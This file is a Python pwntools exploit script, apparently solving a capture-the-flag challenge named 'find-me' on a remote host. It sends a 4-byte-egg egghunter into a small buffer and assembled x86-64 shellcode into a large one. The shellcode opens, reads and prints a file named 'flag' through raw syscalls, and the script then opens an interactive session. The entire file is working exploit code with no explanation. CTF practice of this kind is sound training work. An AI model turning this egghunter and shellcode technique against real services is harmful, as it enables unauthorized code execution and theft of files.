from pwn import *

context.arch = 'amd64'



p = remote('lmao.lol', 20709)

# context.terminal = ['tmux', 'splitw', '-h']
# p = process('./find-me')
# gdb.attach(p, gdbscript='''
#     b *0x4017d3
#     c
# ''')

shellcode = asm(f'''
   XOR RAX, RAX
   MOV RAX, 0x67616C662F
   PUSH RAX
   MOV RDI, RSP


   XOR RSI, RSI
   XOR RDX, RDX
   MOV RAX, 2
   SYSCALL

   MOV RDI, RAX
   MOV RSI, RSP
   MOV RDX, 200
   XOR RAX, RAX
   SYSCALL

   MOV RDI, 1
   MOV RSI, RSP
   MOV RDX, 200
   MOV RAX, 1
   SYSCALL

   XOR RDI, RDI
   MOV RAX, 60
   SYSCALL
''')
# lea rcx, [rip + 0x10 - 0x7]

egg = b"\x90" * 4

egghunter = asm(f'''
mov rcx, rax
skip:
    inc rcx
    jmp search
search:
    cmp dword ptr [rcx], 0x90909090
    jne skip
    
    cmp dword ptr [rcx + 4], 0x90909090
    jne skip
    
    jmp rcx
''')

payload = egg + egg + shellcode

p.recvuntil(b'enter your smallbuf shellcode').decode('utf-8').strip()
p.sendline(egghunter)
print("egg hunter len is", len(egghunter))
print(f"Egghunter bytecode: {egghunter.hex()}")

p.recvuntil(b'enter your bigbuf shellcode:').decode('utf-8').strip()
p.sendline(payload)
print("shellcode len is", len(payload))
print(f"shellcode: {payload.hex()}")

p.interactive()
